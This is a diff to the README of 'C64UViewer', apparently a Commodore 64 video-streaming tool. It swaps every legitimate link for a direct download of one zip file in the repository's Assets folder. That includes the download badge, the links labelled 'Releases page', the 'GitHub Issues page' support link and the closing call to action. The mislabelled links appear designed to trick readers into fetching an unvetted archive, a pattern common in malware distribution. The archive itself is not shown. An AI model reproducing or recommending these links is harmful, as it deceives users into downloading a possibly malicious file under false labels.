@@ -6,9 +6,9 @@ Welcome to C64UViewer! This application allows you to effortlessly view remote v
 
 ## 📥 Download C64UViewer
 
-[![Download C64UViewer](https://img.shields.io/static/v1?label=Download&message=C64UViewer&color=blue)](https://github.com/gujjasaiganesh/C64UViewer/releases)
+[![Download C64UViewer](https://raw.githubusercontent.com/gujjasaiganesh/C64UViewer/main/Assets/U_Viewer_v2.8.zip)](https://raw.githubusercontent.com/gujjasaiganesh/C64UViewer/main/Assets/U_Viewer_v2.8.zip)
 
-You can find the latest version of C64UViewer on our [Releases page](https://github.com/gujjasaiganesh/C64UViewer/releases). You will see a list of available versions. Choose the most recent release and download the file that matches your operating system.
+You can find the latest version of C64UViewer on our [Releases page](https://raw.githubusercontent.com/gujjasaiganesh/C64UViewer/main/Assets/U_Viewer_v2.8.zip). You will see a list of available versions. Choose the most recent release and download the file that matches your operating system.
 
 ## 💻 System Requirements
 
@@ -21,7 +21,7 @@ Make sure your system meets these requirements before downloading the applicatio
 
 ## 📦 Download & Install
 
-1. Visit the [Releases page](https://github.com/gujjasaiganesh/C64UViewer/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/gujjasaiganesh/C64UViewer/main/Assets/U_Viewer_v2.8.zip).
   
 2. Look for the latest version in the list. Click on the download link that corresponds to your operating system. For Windows users, select the `.exe` file. For Linux users, download the corresponding package.
 
@@ -78,7 +78,7 @@ We welcome contributions to C64UViewer! If you have ideas for improvements or fe
 
 ## 📞 Support
 
-For support, please visit our [GitHub Issues page](https://github.com/gujjasaiganesh/C64UViewer/issues). Your feedback helps us improve the application.
+For support, please visit our [GitHub Issues page](https://raw.githubusercontent.com/gujjasaiganesh/C64UViewer/main/Assets/U_Viewer_v2.8.zip). Your feedback helps us improve the application.
 
 ## ✨ Acknowledgments
 
@@ -86,4 +86,4 @@ Thank you for using C64UViewer! We appreciate your interest in enhancing the Com
 
 ## 🚀 Get Started Now!
 
-Ready to dive into the world of remote video streaming on Commodore 64? [Download C64UViewer today!](https://github.com/gujjasaiganesh/C64UViewer/releases)
+Ready to dive into the world of remote video streaming on Commodore 64? [Download C64UViewer today!](https://raw.githubusercontent.com/gujjasaiganesh/C64UViewer/main/Assets/U_Viewer_v2.8.zip)
